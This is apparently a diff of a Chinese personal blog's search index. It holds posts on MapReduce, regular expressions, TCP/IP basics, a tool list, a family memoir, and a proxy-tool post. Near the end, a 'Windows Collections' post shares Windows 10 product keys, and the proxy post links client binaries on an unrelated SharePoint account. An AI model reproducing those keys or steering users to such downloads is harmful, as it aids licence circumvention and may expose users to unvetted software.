+<p>用这种函数风格写出的程序自动就拥有了在一个大的PC机集群上并执行的能力。运行时系统会负责细节：切分输入数据，在一组机器上调度执行程序，处理机器错误，以及管理所需的机器间通信。这允许不具备任何并行和分布式系统经验的程序员也能轻松地利用一个大型分布式系统的资源。<br>我们的MapReduce实现运行在一个大型PC机集群上，且具有很好的扩展性：一个典型的MapReduce作业运行在Google的集群上。<br><strong>编程模型</strong><br>计算过程就是输入一组key/value对，再生成一组key/value对。MapReduce库的使用者用两个函数来表示这个过程：map和reduce。</p>
+<p>map由使用者编写,使用一个输入key/value对，生成一组中间key/value对。MapReduce库将有着相同中间Key I中间的value都组合在一起，再传给reduce函数。<br>reduce也由使用者编写，它接受一个中间Key I 和一组与I对应的value.他将这些value合并为一个可能更小的value集合。通常每个reduce调用只产生0或1输出value.中间value是通过一个迭代器提供给reduce函数的。这允许我们操作那些因为大到找不到连续存放的内存而使用链表的value集合。</p>
+<p>Example:</p>
+<figure class="highlight q"><table><tr><td class="code"><pre><code class="hljs q"><span class="hljs-built_in">key</span>,String <span class="hljs-built_in">value</span>):<br>       <span class="hljs-comment">//key:文档名</span><br>       <span class="hljs-comment">//value：文档内容</span><br>       for <span class="hljs-built_in">each</span> word w in <span class="hljs-built_in">value</span>:<br>           EmitIntermediate(w,<span class="hljs-string">"1"</span>);<br>reduce(Stringkey,Iterator values):<br>    <span class="hljs-comment">//key:一个单词</span><br>    <span class="hljs-comment">//value:计数值列表</span><br>    <span class="hljs-type">int</span> result = <span class="hljs-number">0</span>;<br>    for <span class="hljs-built_in">each</span> v in values:<br>        result += ParseInt(v);<br>    Emit(AsString(result));<br></code></pre></td></tr></table></figure>
+
+<p>map函数将每个单词与出现次数一同输出（↑例子中鸡蛋的那输出“1”）reduce函数将针对某个特定词输出的次数都合并相加。</p>
+<p>另外，使用者要写代码填充一个符合MapReduce规格的对象，内容包括输入和输出文件的名字，以及可选的调节参数。之后使用者调用MapReduce函数，将指定到对象传进去。用户代码会与MapReduce库链接到一起。</p>
+<p><strong>实现</strong><br>许多不同的MapReduce的实现都是可行的。选择哪一个要取决于环境。例如，一种实现可能适合于小型的共享内存机器，一种实现可能适合于大型的NUMA多处理器机器，而另一种则适合于更大型的联网机器集。</p>
+<p>本部分描述的实现主要面向Google内部广泛使用的计算环境：大型的商用PC机集群，互相之间用交换式以太网连接。我们的环境是：</p>
+<p>主要使用的机器为双核X86处理器，运行Linux系统，每台机器的内存从2GB到4GB不等。</p>
+<p>使用的都是商用网络硬件设备——在机器层面上通常从100Mbps到1Gbps不等，但平均起来要比总带宽的一半少很多。</p>
+<p>集群中拥有数百或数千台机器，因此机器错误经常出现。</p>
+<p>每台机器都使用廉价的IDE硬盘来提供存储功能。我们使用一种内部开发的分布式文件系统来管理这些磁盘上的数据。这个文件系统通过复制的方法在不可靠的硬件之上提供了实用性与可靠性。</p>
+<p>用户向一个调度系统提交作业。每个作业包括了一个任务集，会由调度器调度到集群内可用的一组机器上。</p>
 ]]></content>
       <categories>
         <category>docs</category>
@@ -2981,6 +2668,66 @@ sudo apt-get upgrade</code></p>
 <p><code>docekr-compose --version</code></p>
 </li>
 </ol>
+]]></content>
+      <categories>
+        <category>docs</category>
+        <category>python</category>
+        <category>index</category>
+      </categories>
+      <tags>
+        <tag>Python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>regular-expression</title>
+    <url>/2020/05/05/regular-expression/</url>
+    <content><![CDATA[<p>正则表达式的重新学习</p>
+<h2 id="回炉重学"><a href="#回炉重学" class="headerlink" title="回炉重学"></a>回炉重学</h2><p>之前学过正则表达式，仅仅停留在会用阶段，每次用的时候还要查语法，问过阿里和腾讯的大牛，有没有好的方法，他们说他们用的时候也要现查，我觉得这个操作不对。</p>
+<p>昨晚做了一个梦，然后突然看明白了。</p>
+<a id="more"></a>
+
+<blockquote>
+<p>正则表达式是定义搜索模式的一串字符串。 </p>
+</blockquote>
+<ol>
+<li>基础<br>正则表达式通常格式化为<code>/&lt;rules&gt;/&lt;flags&gt;</code>  </li>
+</ol>
+<ul>
+<li><strong>/p/g</strong>匹配所有的小写<strong>p</strong><br>a<strong>pp</strong>le</br></li>
+</ul>
+<p><strong>p</strong>ancake<br><strong>p</strong>inea<strong>pp</strong>le<br>mango<br>Plum</p>
+<ul>
+<li><strong>/pp/g</strong>匹配所有的小写字母pp<br>a<strong>pp</strong>le<br>pinea<strong>pp</strong>le<br>ha<strong>pp</strong>iness<br>si<strong>pp</strong>ing a<strong>pp</strong>le juice<br>papaya</li>
+<li><strong>/[aeiou]/g</strong> 从一组字符中匹配一个字符<br>br<strong>i</strong>nj<strong>a</strong>l</br></li>
+</ul>
+<p><strong>a</strong>v<strong>o</strong>c<strong>a</strong>d<strong>o</strong><br><strong>o</strong>n<strong>io</strong>n<br>rhythm  </p>
+<ul>
+<li><strong>/[a-z]/g</strong>匹配所有小写字母<br>H<strong>john</strong>_<strong>s</strong></br></li>
+</ul>
+<p><strong>matej</strong>29  </p>
+<ul>
+<li><strong>/[A-Za-z0-9]/g</strong>匹配大小写字母和数字横行下划线  </li>
+<li><strong>/[^aeiou]/g</strong>匹配非元音字符  </li>
+<li>匹配数字字符<strong>\d</strong> 转义字符 <strong>\d</strong>表示匹配数字字符0-9<blockquote>
+<p><strong>\D</strong> 是<strong>\d</strong>的反面，相当于[^0-9]</p>
+</blockquote>
+</li>
+<li>单词字符 <strong>\w</strong>匹配单词字符，包括小写字母a-z,大写字母A-Z,数字0-9,下划线_<blockquote>
+<p><strong>\W</strong> 相当于[^a-zA-Z0-9_]</p>
+</blockquote>
+</li>
+<li>空白字符 \s 匹配空白字符，具体匹配取决于正则表达式引擎，大多数包括：</li>
+</ul>
+<ol>
+<li>空格</li>
+<li>tab制表符\t</li>
+<li>回车\r</li>
+<li>换行符\n</li>
+<li>换页\f</li>
+</ol>
+<ul>
+<li>. 可以匹配任意一个字符</li>
+</ul>
 ]]></content>
       <categories>
         <category>docs</category>
@@ -3076,6 +2823,32 @@ sudo apt-get upgrade</code></p>
       </categories>
       <tags>
         <tag>javascript,study,collect</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sofar</title>
+    <url>/2020/08/24/sofar/</url>
+    <content><![CDATA[<p><img src="https://images.yrzdm.com/imgs/20200824/Bj4scjqFnsJc.png?imageslim" alt="近远"></p>
+<a id="more"></a>
+
+<p>弟弟订婚，顶着大雨回家，去看了看爷爷。</p>
+<p>每次的心情就像Nightswish所唱《I Want My Tears Back》一样。Before the years take me , I wish to see the lost in me . I want my tears back…</p>
+<p>爷爷现在已经开始糊涂，虽然每次去每个人名字都能叫得上来，因为在养老院，更多的是院长和护工的照顾，因为长期的陪伴关系，爷爷开始把院长认为是他的家人。虽然糊涂，但是每次还是叫着让奶奶来。</p>
+<p>小时候我发育比较晚，个子比较矮。爷爷给我做了小弓箭，长大一点后，爷爷又用竹子做了一个大版的弓箭，我不知道爷爷是怎么会的，但是爷爷做的弓箭非常的精良。</p>
+<p>因为务农的缘故，虽然个子矮但是农活还是要做的，当时爸妈在外打工我算是留守儿童，爷爷还给做了一份小尺寸的农具，有平耙，有扬锨等，大伯在时经常说我“小人小马小刀枪”。</p>
+<p>小时候爷爷说我是属狗的，经常把家里的东西拖到外边去，然后弄丢。再大点，别人家都在放风筝，爷爷给我做了一个八卦风筝，连300m的线滚对于当时的我来说是负担也是骄傲。</p>
+<p><img src="https://images.yrzdm.com/imgs/20200824/OyvpSAiiQXvS.png?imageslim" alt="八卦风筝"></p>
+<p>大概是这样，里面还有好多细节。</p>
+<p>爷爷当了一辈子的优秀共产党员，如今还要迷糊的和养老院的院长一起建党支部，“还有这么熊气的单位，连个党支部也没有….”</p>
+<p>如今我因沉迷城里的生活却不能陪伴爷爷变老…爷爷残缺的晚年也是我残缺的当前。</p>
+]]></content>
+      <categories>
+        <category>docs</category>
+        <category>live</category>
+        <category>memory</category>
+      </categories>
+      <tags>
+        <tag>live</tag>
       </tags>
   </entry>
   <entry>
@@ -3216,29 +2989,70 @@ sudo apt-get upgrade</code></p>
       </tags>
   </entry>
   <entry>
-    <title>sofar</title>
-    <url>/2020/08/24/sofar/</url>
-    <content><![CDATA[<p><img src="https://images.yrzdm.com/imgs/20200824/Bj4scjqFnsJc.png?imageslim" alt="近远"></p>
+    <title>TCP/IP基础知识总结</title>
+    <url>/2020/11/05/tcpip/</url>
+    <content><![CDATA[<p>我们接触计算机网络最多的协议，那就是TCP/IP协议了，TCP/IP协议同时也是互联网中最为著名的协议。</p>
 <a id="more"></a>
 
-<p>弟弟订婚，顶着大雨回家，去看了看爷爷。</p>
-<p>每次的心情就像Nightswish所唱《I Want My Tears Back》一样。Before the years take me , I wish to see the lost in me . I want my tears back…</p>
-<p>爷爷现在已经开始糊涂，虽然每次去每个人名字都能叫得上来，因为在养老院，更多的是院长和护工的照顾，因为长期的陪伴关系，爷爷开始把院长认为是他的家人。虽然糊涂，但是每次还是叫着让奶奶来。</p>
-<p>小时候我发育比较晚，个子比较矮。爷爷给我做了小弓箭，长大一点后，爷爷又用竹子做了一个大版的弓箭，我不知道爷爷是怎么会的，但是爷爷做的弓箭非常的精良。</p>
-<p>因为务农的缘故，虽然个子矮但是农活还是要做的，当时爸妈在外打工我算是留守儿童，爷爷还给做了一份小尺寸的农具，有平耙，有扬锨等，大伯在时经常说我“小人小马小刀枪”。</p>
-<p>小时候爷爷说我是属狗的，经常把家里的东西拖到外边去，然后弄丢。再大点，别人家都在放风筝，爷爷给我做了一个八卦风筝，连300m的线滚对于当时的我来说是负担也是骄傲。</p>
-<p><img src="https://images.yrzdm.com/imgs/20200824/OyvpSAiiQXvS.png?imageslim" alt="八卦风筝"></p>
-<p>大概是这样，里面还有好多细节。</p>
-<p>爷爷当了一辈子的优秀共产党员，如今还要迷糊的和养老院的院长一起建党支部，“还有这么熊气的单位，连个党支部也没有….”</p>
-<p>如今我因沉迷城里的生活却不能陪伴爷爷变老…爷爷残缺的晚年也是我残缺的当前。</p>
+<h3 id="TCP-IP的历史背景"><a href="#TCP-IP的历史背景" class="headerlink" title="TCP/IP的历史背景"></a>TCP/IP的历史背景</h3><p>最初还没有TCP/IP协议的时候，也就是再20世纪60年代，许多国家和地区认识到通信技术的重要性。美国国防部希望能够研究一种即时通信线路被破坏也能够通过其他路线进行通信的技术。为了实现这种技术，出现了<strong>分组</strong>网络。</p>
+<p><img src="https://images.yrzdm.com/imgs/20201103/wFis57CA2YOm.png?imageslim" alt="分组网络"></p>
+<p>即使再两个节点通信的过程中，几个节点遭到破坏，却依然能够通过改变线路等方式使得两个节点之间进行通信。</p>
+<p>这种分组网络促使了<strong>ARPANET（advanced Research Projects Agency Network）</strong>的诞生。ARPANET是第一个具有分布式控制的广域包分t组交换网络，也是最早实现TCP/IP协议的前身。</p>
+<p><img src="https://images.yrzdm.com/imgs/20201104/YPnHWGVAQHxa.png?imageslim" alt="TCP/IP协议包含的协议"></p>
+<p>以上协议汇总起来，就是TCP/IP协议蔟。</p>
+<h3 id="TCP-IP标准"><a href="#TCP-IP标准" class="headerlink" title="TCP/IP标准"></a>TCP/IP标准</h3><p>TCP/IP 相较于其他的协议标准，更注重<strong>开放性</strong>和<strong>实用性</strong>，即标准能否被实际应用。TCP/IP标准协议就是我们班所熟知的<strong>RFC文档</strong>，RFC不仅规范了协议标准还包含了协议的实现和使用信息。</p>
+<p><a class="link"   href="https://www.rfc-editor.org/rfc-index.html"  target="_blank" rel="noopener">More about RFC<i class="fas fa-external-link-alt"></i></a></p>
+<h3 id="TCP-IP协议簇"><a href="#TCP-IP协议簇" class="headerlink" title="TCP/IP协议簇"></a>TCP/IP协议簇</h3><p>OSI模型一共有七层，从下到上分别是物理层，数据链路层，网络层，传输层(运输层)，会话层，表示层和应用层。</p>
+<p>简化为：应用层，传输层，网络层，通信链路层。</p>
+<p><img src="https://images.yrzdm.com/imgs/20201104/2R7lQxHvCCz2.png?imageslim" alt="简化协议簇"></p>
+<p>我们从通信链路层开始介绍一下这些系一层以及层之间的协议。</p>
+<h4 id="通信链路层"><a href="#通信链路层" class="headerlink" title="通信链路层"></a>通信链路层</h4><p>如果非要细分的话，通信链路层也可以分为物理层和数据链路层。</p>
+<h4 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h4><p>物理层是TCP/IP的最底层是负责传输的硬件，这种哦硬件就相当于是以太网或者电话线路等物理层的设备。</p>
+<h4 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h4><p>数据链路层位于物理层和网络层中间，数据链路层定义了在单个链路上如何传输数据。</p>
+<h4 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h4><p>网络层主要使用<strong>IP</strong>协议，IP协议基于IP地址转发分包数据。<br><img src="https://images.yrzdm.com/imgs/20201104/t3zhMe2TUgk2.png?imageslim" alt="网络层"></p>
+<p>IP协议的主要作用就是将分组数据包发送到目标主机。<br>TCP/IP 分层中的互联网层与传输层的功能通常由操作系统提供。<br>IP协议还隐含着数据链路层的功能，通过IP协议，相互通信的主机之间不论经过怎样的数据链路，都能够实现相互通信。<br>虽然IP也是一种分组交换协议，但是IP协议却不具备重发机制。及时数据没有到达另一端也不会进行重发，所以IP属于非可靠性协议。</p>
+<p>网络层还有一种协议就是<strong>ICMP</strong>，因为IP协议在数据包的发送过程中可能会出现异常，当IP数据包因为异常而无法到达目标地址时，需要给发送端发送一个异常通知，ICMP的主要功能就在于此，ICMP也可以被用来诊断网络状况。</p>
+<h4 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h4><p>TCP协议是传输层协议的一种</p>
+<p>传输层就像高速公路一样，连接两个城市的道路。它的主要功能是让应用层的应用程序之间完成通信和数据交换。在计算机内部运行着很多应用程序，每个应用程序对应一个端口号，我们一般使用端口号来区分这些应用程序。<br><img src="https://images.yrzdm.com/imgs/20201104/H0MHWQCotSfW.png?imageslim" alt="传输层"></p>
+<p>传输层的协议主要分为面向有连接的协议TCP和面向无连接的协议UDP</p>
+<h4 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h4><p>TCP是一种可靠的协议，它能够保证数据包的可靠性交付，TCP能够正确处理传输过程中的丢包、传输顺序错乱等异常情况。此外，TCP还提供拥塞控制用于缓解网络拥堵。</p>
+<h4 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h4><p>UDP是一种不可靠协议，它无法保证数据的可靠交付，相比TCP，UDP不会检查数据包是否到达，网络是否阻塞等情况，但是UDP的效率比较高。</p>
+<p>UDP协议常用于分组数据较少或者广播，多播等视频通信和多媒体领域。</p>
+<h3 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h3><p>在TCP/IP协议簇中，将OSI标准模型中的会话层，表示层都归为应用层。应用层的架构大多属于客户端/服务端模型。在这种架构中，服务端通常会提前部署到服务器上，等待客户端的连接，从而提供服务。</p>
+<p><img src="https://images.yrzdm.com/imgs/20201104/IiElWxTMUlcV.png?imageslim" alt="应用层"></p>
+<h3 id="数据包的发送过程"><a href="#数据包的发送过程" class="headerlink" title="数据包的发送过程"></a>数据包的发送过程</h3><h4 id="数据包结构"><a href="#数据包结构" class="headerlink" title="数据包结构"></a>数据包结构</h4><p><img src="https://images.yrzdm.com/imgs/20201104/7gQO3mKkTNs9.png?imageslim" alt="数据包结构"></p>
+<p>在每一层中，都会对所发送的数据增加一个<strong>头</strong> ，这个头中包含了该层必要的信息。每一层都会对数据进行处理并在数据包中附上这一层的必要信息。</p>
+<h4 id="应用层的处理"><a href="#应用层的处理" class="headerlink" title="应用层的处理"></a>应用层的处理</h4><p>主机A打开某应用程序，或者打开聊天窗口输入<strong>Hello</strong>，点击发送，那么这个<strong>Hello</strong>就作为一个数据包遨游在网络中，首先应用层会对这个数据包进行处理，包括字符编码、格式化等等，这其实是OSI中表现层的工作，只不过在TCP/IP协议中都归为了应用层。<br>数据包在发送的那一刻建立TCP连接，这个连接相当于通道，在这之后其他数据包也会使用通道传输数据。</p>
+<h4 id="传输层的处理"><a href="#传输层的处理" class="headerlink" title="传输层的处理"></a>传输层的处理</h4><p>为了描述信息能够准确的到达另一方，我们使用TCP协议来进行描述。TCP会根据应用的指示，负责建立连接，发送数据和断开连接。</p>
+<p>TCP会在应用数据层的前端附加一个TCP的头部字段，TCP头部包含了<strong>源端口号</strong>和<strong>目标端口号</strong>，这两个端口号用于表明数据包是从哪里发出的，需要发送到哪个应用程序上；TCP头部还包含<strong>序号</strong>，用于表示该包中数据是发送端整个数据中的第几个字节的序列号；TCP头部还包含<strong>校验和</strong>，用于判断数据是否损坏，随后将TCP头部附加在数据包的头部发送给IP</p>
+<h4 id="网络层的处理"><a href="#网络层的处理" class="headerlink" title="网络层的处理"></a>网络层的处理</h4><p>网络层主要负责处理数据包的是IP协议，IP协议将TCP传过来的TCP头部和数据结合当作自己的数据，并在TCP头部的前端加上自己的IP头部。因此，IP数据包后面会紧跟着TCP数据包，后面才是数据本身。IP头部包含目标地址和源地址，紧随在IP头部的还有用来判断后面是TCP还是UDP的信息。</p>
+<p>IP包生成后，会由路由控制表判断应该发送到哪个主机，IP修饰后的数据继续向下发送给路由器或者网络接口的驱动程序，从而实现真正的数据传输。</p>
+<h4 id="通信链路层的处理"><a href="#通信链路层的处理" class="headerlink" title="通信链路层的处理"></a>通信链路层的处理</h4><p>经由IP传过来的数据包，以太网会给数据包附上以太网的头部信息并进行发送处理。以太网头部信息包含接收端的MAC地址、发送端的MAC地址以及以太网类型的以太网数据协议等。</p>
+<p>以下是完整的处理过程和解析过程。</p>
+<p><img src="https://images.yrzdm.com/imgs/20201104/jNAT6FJbiQXq.png?imageslim" alt="传输解析"></p>
+<p>左侧是数据的发送处理过程，应用层数据经过层层处理后变为可以发送昂的数据包，经过物理介质发送到指定主机中。</p>
+<p>数据包的接收流程是发送流程的逆序过程，数据包的解析同样会经过下面这几步。</p>
+<h4 id="通信链路的解析"><a href="#通信链路的解析" class="headerlink" title="通信链路的解析"></a>通信链路的解析</h4><p>目标主机收到数据包后，首选会从以太网的头部找到MAC地址判断是否是发给自己的数据包，如果不是发给自己的数据包则会丢弃该数据包。</p>
+<p>如果收到的数据包是发送给自己的，就会查找以太网类型判断是那种协议，如果是IP协议就会扔给IP协议进行处理。如果是<strong>ARP</strong>协议就会给ARP协议进行处理。如果协议类型是一宗无法识别的协议，就会将该数据包直接丢弃。</p>
+<h4 id="网络层的解析"><a href="#网络层的解析" class="headerlink" title="网络层的解析"></a>网络层的解析</h4><p>经过以太网处理后的数据包扔给网络层进行处理，我们假设协议类型是IP协议，那么，在IP收到数据包后就会解析IP头部信息，判断IP头部信息中的IP地址是否和自己的IP地址匹配，如果匹配则接受数据并判断上一层协议是TCP还是UDP，如果不匹配则直接丢弃。</p>
+<blockquote>
+<p>在路由的转发过程中，有的时候IP地址并不是自己的，这个时候需要借助路由表协助处理。</p>
+</blockquote>
+<h4 id="传输层的处理-1"><a href="#传输层的处理-1" class="headerlink" title="传输层的处理"></a>传输层的处理</h4><p>在传输层中，我们默认使用TCP协议，在TCP处理过程中，首先会计算一下<strong>校验和</strong>，判断数据是否被损坏。然后检查是否按照序号接受数据，最后检查端口号，确定具体是哪个应用程序。</p>
+<p>数据被完整识别后，会传递给由端口号识别的应用程序进行处理。</p>
+<h4 id="应用程序的处理"><a href="#应用程序的处理" class="headerlink" title="应用程序的处理"></a>应用程序的处理</h4><p>接收端指定的应用程序会处理发送方传递过来的数据，通过解码等操作识别出数据的内容，然后把对应的数据存储在磁盘上，返回一个保存成功的消息给发送方，如果保存失败，则返回错误消息。</p>
+<p>数据包经过每层后，该层协议都会在数据包附上头部信息。</p>
+<p><img src="https://images.yrzdm.com/imgs/20201105/mhGyjVXW77LA.png?imageslim" alt="包解析处理"></p>
+<p>在数据包的发送过程中，各层以此对数据包添加了头部信息，每个头部都包含发送端和接收端地址以及上一层的协议类型。以太网会使用MAC地址，IP会用IP地址，TCP/UDP则会用端口号作为识别两端主机的地址。</p>
+<p>每个分层的包首部还包含一个识别位，它是用来标识上一层协议的种类信息。</p>
 ]]></content>
       <categories>
         <category>docs</category>
-        <category>live</category>
-        <category>memory</category>
+        <category>python</category>
+        <category>index</category>
       </categories>
       <tags>
-        <tag>live</tag>
+        <tag>basic,protocol,network</tag>
       </tags>
   </entry>
   <entry>
@@ -3283,6 +3097,92 @@ sudo apt-get upgrade</code></p>
       <tags>
         <tag>Ubuntu</tag>
         <tag>install</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>利器收集</title>
+    <url>/2020/02/11/tool-colloections/</url>
+    <content><![CDATA[<p><img src="http://imgs.yrzdm.com/imgs/20200211/SomvGyOBuRLo.png" alt="mark"><br>收集了经常用到的工具，为了年纪大了不太好的记忆。</p>
+<a id="more"></a>
+<h3 id="web工具"><a href="#web工具" class="headerlink" title="web工具"></a>web工具</h3><ol>
+<li>typora<br><img src="http://imgs.yrzdm.com/imgs/20200211/PuAjqMvUv3Ry.png" alt="mark"><br><a class="link"   href="http://www.typora.io"  target="_blank" rel="noopener">Typora<i class="fas fa-external-link-alt"></i></a></li>
+<li>markdown转换为html,pdf<br><a class="link"   href="http://md.aclickall.com"  target="_blank" rel="noopener">Md2All<i class="fas fa-external-link-alt"></i></a></li>
+<li>将代码片段生成图片<br><a class="link"   href="http://codezen.rishimohan.me/"  target="_blank" rel="noopener">codezen<i class="fas fa-external-link-alt"></i></a><br><a class="link"   href="https://carbon.now.sh/"  target="_blank" rel="noopener">carbon<i class="fas fa-external-link-alt"></i></a></li>
+<li>变量命名<br>类名函数名变量名不知道如何起名才好，可以用这个工具。<br><a class="link"   href="https://unbug.github.io/codelf/#%E5%B8%85%E4%B8%99"  target="_blank" rel="noopener">unbug<i class="fas fa-external-link-alt"></i></a></li>
+<li>Screenzy beautify your screenshots!<br><a class="link"   href="https://screenzy.io/"  target="_blank" rel="noopener">screenzy<i class="fas fa-external-link-alt"></i></a></li>
+<li>emojicp<br>快速复制emoji<br><a class="link"   href="https://emojicp.com/"  target="_blank" rel="noopener">emojicp<i class="fas fa-external-link-alt"></i></a></li>
+<li>mdnice<br>在线markdown排版 <a class="link"   href="https://mdnice.com/"  target="_blank" rel="noopener">mdnice<i class="fas fa-external-link-alt"></i></a>  </li>
+<li>markdown转换<br><a class="link"   href="https://tableconvert.com/"  target="_blank" rel="noopener">tableconvert<i class="fas fa-external-link-alt"></i></a>  </li>
+</ol>
+<h3 id="pc工具"><a href="#pc工具" class="headerlink" title="pc工具"></a>pc工具</h3><ol>
+<li>Rufus<br>制作系统盘支持win linux<br><a class="link"   href="https://github.com/pbatard/rufus"  target="_blank" rel="noopener">Rufus<i class="fas fa-external-link-alt"></i></a></li>
+<li>uTools<br>快捷启动和搜索 类似 wox<br><a class="link"   href="http://u.tools"  target="_blank" rel="noopener">uTools<i class="fas fa-external-link-alt"></i></a></li>
+</ol>
+<h3 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h3><ol>
+<li>Android VivaCut<br>安卓视频剪辑<br><a href="-">Android VivaCut</a></li>
+<li>TaiChi<br>免Root Xpose框架<br><a class="link"   href="http://taichi.tool"  target="_blank" rel="noopener">TaiChi<i class="fas fa-external-link-alt"></i></a><br>🍦</li>
+</ol>
+<p>to be continue</p>
+]]></content>
+      <categories>
+        <category>docs</category>
+        <category>index</category>
+        <category>Tools</category>
+      </categories>
+      <tags>
+        <tag>Python</tag>
+        <tag>Tools</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Science and the Internet</title>
+    <url>/2018/08/07/universets/</url>
+    <content><![CDATA[<p>普及一下科学冲浪技巧</p>
+<h2 id="普及一下ssr"><a href="#普及一下ssr" class="headerlink" title="普及一下ssr"></a>普及一下ssr</h2><h3 id="基本原理是在歪果仁哪里租一台服务器，然后在服务器上搭建一个反向代理的服务，歪果仁的服务器访问歪果仁的站点肯定是so爽so快soEasy。"><a href="#基本原理是在歪果仁哪里租一台服务器，然后在服务器上搭建一个反向代理的服务，歪果仁的服务器访问歪果仁的站点肯定是so爽so快soEasy。" class="headerlink" title="基本原理是在歪果仁哪里租一台服务器，然后在服务器上搭建一个反向代理的服务，歪果仁的服务器访问歪果仁的站点肯定是so爽so快soEasy。"></a>基本原理是在歪果仁哪里租一台服务器，然后在服务器上搭建一个反向代理的服务，歪果仁的服务器访问歪果仁的站点肯定是so爽so快soEasy。</h3><blockquote>
+<p>使用方式，打开app然后去找可用的节点，ssr：或者ss：开头的一串乱码》》》 或者是使用软件扫描节点的二维码，直接输入节点信息也可以。</p>
+</blockquote>
+<p>&nbsp;&nbsp;&nbsp;<img src="https://i.loli.net/2018/08/10/5b6d5b0696832.png" height="20px"  width="25px">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>&lt;img src=”<a class="link"   href="https://i.loli.net/2018/08/10/5b6d69daea50a.png&quot;"  target="_blank" rel="noopener">https://i.loli.net/2018/08/10/5b6d69daea50a.png&quot;<i class="fas fa-external-link-alt"></i></a> height=”10px” width=”10px” &gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br><img src="https://i.loli.net/2018/08/10/5b6d5b5544a7b.png" height="20px" width="25px">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br><img src="https://i.loli.net/2018/08/10/5b6d5c637c372.png" height="25px"  width="25px"></p>
+<table>
+<thead>
+<tr>
+<th align="center">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;win</th>
+<th align="center">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Mac</th>
+<th align="center">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;iOS</th>
+<th align="center">&nbsp;&nbsp;&nbsp;&nbsp;Android</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><a class="link"   href="https://stusmanraschid-my.sharepoint.com/:u:/g/personal/roy_stu_smanra_sch_id/ERZyynbnsBVJnuhWfSG_nSYBLm9Akvg_1j-8EhTbyD35dw?e=H6CCtS"  target="_blank" rel="noopener">windows<i class="fas fa-external-link-alt"></i></a></td>
+<td align="center"><a class="link"   href="https://stusmanraschid-my.sharepoint.com/:u:/g/personal/roy_stu_smanra_sch_id/EcWUjcEomntOobsSqmhjPWgBIejGykM4PeeRaf_UxzyNVg?e=zdSSvl"  target="_blank" rel="noopener">Mac<i class="fas fa-external-link-alt"></i></a></td>
+<td align="center">联系我下载</td>
+<td align="center"><a class="link"   href="https://stusmanraschid-my.sharepoint.com/:u:/g/personal/roy_stu_smanra_sch_id/EXFjOweAE4tPt_yEB1bLnDIBzAzPQ3zVgakBtOQkbXMD1g?e=a7X8ZN"  target="_blank" rel="noopener">Android<i class="fas fa-external-link-alt"></i></a></td>
+</tr>
+</tbody></table>
+<p><em>请低调传播</em></p>
+]]></content>
+      <categories>
+        <category>ssr</category>
+        <category>python</category>
+        <category>index</category>
+      </categories>
+      <tags>
+        <tag>ssr,shadow,collect</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Windows Collections</title>
+    <url>/2018/11/22/windows-collections/</url>
+    <content><![CDATA[<p>##windows 10 license</p>
+<p><strong>license</strong><br>Win10专业版 7M2H3-J3VPB-2X2DK-33CC2-CHPH4 ​<br>Win10 企业版：XCBWP-GN2BX-QJDYV-XQV7K-C7JWR Win10<br>专业版：V942D-C7NFG-773PY-MT398-F3KTY</p>
+<p>Collection up to spare</p>
+]]></content>
+      <categories>
+        <category>license</category>
+        <category>windows</category>
+        <category>index</category>
+      </categories>
+      <tags>
+        <tag>windows,license,collect</tag>
       </tags>
   </entry>
   <entry>
@@ -3403,148 +3303,284 @@ sudo apt-get upgrade</code></p>
       </tags>
   </entry>
   <entry>
-    <title>Science and the Internet</title>
-    <url>/2018/08/07/universets/</url>
-    <content><![CDATA[<p>普及一下科学冲浪技巧</p>
-<h2 id="普及一下ssr"><a href="#普及一下ssr" class="headerlink" title="普及一下ssr"></a>普及一下ssr</h2><h3 id="基本原理是在歪果仁哪里租一台服务器，然后在服务器上搭建一个反向代理的服务，歪果仁的服务器访问歪果仁的站点肯定是so爽so快soEasy。"><a href="#基本原理是在歪果仁哪里租一台服务器，然后在服务器上搭建一个反向代理的服务，歪果仁的服务器访问歪果仁的站点肯定是so爽so快soEasy。" class="headerlink" title="基本原理是在歪果仁哪里租一台服务器，然后在服务器上搭建一个反向代理的服务，歪果仁的服务器访问歪果仁的站点肯定是so爽so快soEasy。"></a>基本原理是在歪果仁哪里租一台服务器，然后在服务器上搭建一个反向代理的服务，歪果仁的服务器访问歪果仁的站点肯定是so爽so快soEasy。</h3><blockquote>
-<p>使用方式，打开app然后去找可用的节点，ssr：或者ss：开头的一串乱码》》》 或者是使用软件扫描节点的二维码，直接输入节点信息也可以。</p>
-</blockquote>
